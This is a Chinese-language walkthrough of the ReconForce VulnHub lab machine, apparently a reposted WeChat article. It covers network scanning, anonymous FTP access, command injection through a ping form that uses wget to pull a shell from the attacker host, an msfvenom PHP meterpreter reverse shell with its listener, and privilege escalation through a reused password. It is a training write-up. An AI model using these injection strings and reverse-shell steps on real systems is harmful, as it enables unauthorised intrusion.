# vulnhub之ReconForce的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650746688&idx=1&sn=b19bbfa46f89a762366caa5c30f65401&chksm=87148e40b0630756b75925c11b00c22d070e27ef435d0ee9506a5341ec47b7bd9fc6f3f95c94&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650746688&idx=1&sn=b19bbfa46f89a762366caa5c30f65401&chksm=87148e40b0630756b75925c11b00c22d070e27ef435d0ee9506a5341ec47b7bd9fc6f3f95c94&scene=27#wechat_redirect)

今天实践的是ReconForce，

用workstation导入成功，但是扫描不出来地址，换成virtualbox，

sudo netdiscover -r 192.168.56.0/24，

![](../Images/e70bcd5d0087a7e9feef5562f74168d9.png)

接着做端口扫描，sudo nmap -sS -sV -T5 -A -p- 192.168.56.107，

![](../Images/62fa0f63cb97299d2baa481491fc4827.png)

发现ftp可匿名登录，那就登录一下看看，发现个可能是密码的信息，

![](../Images/9c4021f33aad75fada77e9065c4fd643.png)

访问http页面，里面有个TroubleShoot链接可点击，

![](../Images/17193f61d54db492637873781b1b864d.png)

点击后需要用户名密码认证，尝试admin/Security@hackNos，登录成功，

![](../Images/c871df934158eb61c789244cf8b6623e.png)

页面中的ping scan应该是可以执行命令，

在kali攻击机上做一个webshell，

sudo msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.56.102 LPORT=4444 R > shell.php，

在kali攻击机上开启http下载服务，python2 -m SimpleHTTPServer，

在ping scan的输入框中填入，并点击提交，

127.0.0.1|wget http://192.168.56.102:8000/shell.php，

查询一下shell.php文件是否上传成功，127.0.0.1|ls，

![](../Images/50ccfbac77c74fbe5922cae43a885c92.png)

在kali攻击机上开个meterpreter的反弹shell监听，

msfconsole  
use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set LHOST 192.168.56.102  
set LPORT 4444  
run  

访问webshell，http://192.168.56.107/5ecure/shell.php，

获取到靶机的shell，不是root，需要提权，  

![](../Images/fb0b27645ca5fbd16d58200b063b4c54.png)

先转成交互式shell，

python -c 'import pty; pty.spawn("/bin/bash")'，

发现个recon账户，猜测密码还是Security@hackNos，

切换到recon，发现能再直接切到root，搞定，

![](../Images/b25afeb1119dc5b75e0c39ae64dad1c4.png)
